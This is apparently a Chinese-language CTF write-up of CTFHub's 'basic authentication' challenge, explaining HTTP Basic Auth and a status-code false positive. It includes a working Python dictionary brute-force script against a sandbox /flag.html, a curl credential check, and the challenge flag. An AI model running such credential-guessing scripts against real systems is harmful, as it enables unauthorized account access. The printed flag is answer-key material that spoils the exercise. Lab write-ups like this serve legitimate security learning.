基础认证 - CTFHub Web 入门 Writeup

2026年9月16日 CTFHub Web安全 HTTP Basic Auth Python 字典爆破

这道题考察的是 Web 中极其经典的 HTTP 基础认证（Basic Authentication）。题目直接提供了一个弱密码字典附件，要求我们通过 Python 编写脚本进行字典爆破。这不仅是一次 Web 基础知识的锻炼，更是我真正理解“HTTP 状态码 200 与 401 区别”的里程碑。

一、题目信息

  • 题目名称：基础认证
  • 题目平台：CTFHub
  • 题目类型：Web / HTTP 认证 / 暴力破解
  • 题目提示：HTTP 基本认证，允许 HTTP 用户代理（如浏览器）在请求时提供用户名和密码。
  • 附件内容： 10_million_password_list_top_100.txt（100个弱密码字典）
  • 最终Flag： ctfhub{ec58bf1d6cf2df9d3fd3f9e0}

二、解题过程（详细步骤与踩坑全记录）

1. 初探浏览器与认知陷阱

点击题目链接，浏览器弹出了系统级的账号密码登录框。随便输入了几个常规密码，不仅无法登录，点击“取消”还会反复弹窗。这是因为浏览器缓存了之前的 401 错误状态，进入了死循环。

此时，我们决定放弃浏览器，使用 Python 写脚本进行字典爆破。

2. 环境搭建与踩坑（No such file / ModuleNotFound）

在写脚本的过程中，我遇到了经典的 Mac 环境问题：

  • 踩坑 1：路径错误。 在终端执行 `python3 brute_basic_auth.py` 时，报错 No such file or directory。原因是脚本保存在桌面，而终端工作目录在用户主目录。解决：使用 cd ~/Desktop 切换目录。
  • 踩坑 2：缺少依赖库。 运行时报错 ModuleNotFoundError: No module named 'requests'。解决：执行 pip3 install requests 安装网络请求库。

3. 致命的逻辑误报（核心踩坑）

我编写了第一版爆破脚本，脚本逻辑是：发送请求并判断 if response.status_code == 200。脚本运行后，终端输出了“🎉 爆破成功！密码：123456”。

然而，当我把 admin:123456 输入到浏览器或 curl 去访问时，服务器依然返回 401 Authorization Required（密码错误）。

为什么会误报？因为脚本里请求的地址是主页 http://.../。主页是不需要密码的！无论你输入什么密码，服务器都会返回 200 OK，并显示“hello guest”。我的脚本只看状态码 200，误以为密码正确，实际上是被主页骗了。

4. 修正脚本，成功爆破

锁定原因后，我们修改了 Python 脚本。关键的修改点是：直接请求受保护的页面 `/flag.html`，并增加内容特征判断。正确的代码如下：

import requests
import os

# 直接请求受保护页面 /flag.html
url = "http://challenge-0989f5bbfab3b411.sandbox.ctfhub.com:10800/flag.html"
dict_file = "10_million_password_list_top_100.txt"
usernames = ["admin", "administrator", "root", "test", "user", "ctf"]

with open(dict_file, 'r', encoding='utf-8', errors='ignore') as f:
    passwords = [line.strip() for line in f if line.strip()]

for username in usernames:
    for pwd in passwords:
        # 发送请求，注意必须带上认证信息
        response = requests.get(url, auth=(username, pwd), timeout=3)
        # 严格判定：状态码 200 且返回内容包含 ctfhub 特征
        if response.status_code == 200 and "ctfhub" in response.text:
            print(f"爆破成功！账号: {username}, 密码: {pwd}")
            print(f"Flag: {response.text}")
            exit()

终端成功跑出了真实的账号密码，并直接打印出了包含 ctfhub{...} 的响应页面。

最终 Flag： ctfhub{ec58bf1d6cf2df9d3fd3f9e0}

三、知识点总结（往脑子里装的东西）

  • HTTP 基础认证 (Basic Auth)： 客户端将用户名和密码用冒号拼接，再进行 Base64 编码，放入请求头 Authorization: Basic xxxxxx 中发送给服务器。
  • HTTP 状态码 200 与 401 的本质区别：
    • 200 OK：请求成功。但这不代表权限验证通过。很多不需登录的主页永远返回 200。
    • 401 Unauthorized：未授权。这才是真正的密码验证失败。
  • 脚本爆破的严谨性： 编写爆破脚本时，不能只依赖状态码 200 进行判断。必须请求受保护资源，并且结合页面返回内容特征（如关键字 ctfhub）进行双重校验。
  • curl 命令： curl -u user:pass http://.../flag.html 是终端验证 Basic Auth 最快捷的方式，不经过浏览器，避免缓存干扰。

四、踩坑启示录（极其宝贵的实战经验）

💡 为什么我的脚本会产生“成功”的误报？

因为我的第一版脚本请求了主页 /，而主页允许匿名访问。这次踩坑让我深刻认识到：永远不要盲目信任状态码 200。 在安全测试中，必须精准定位到真正需要鉴权的接口或文件路径，然后再去判断响应状态和内容特征。

💡 为什么浏览器输入正确密码还一直弹窗？

浏览器缓存了之前输入错误密码时的 401 状态。解决方式是重启浏览器（或使用无痕模式），或者直接使用终端 curl 命令绕过浏览器验证。
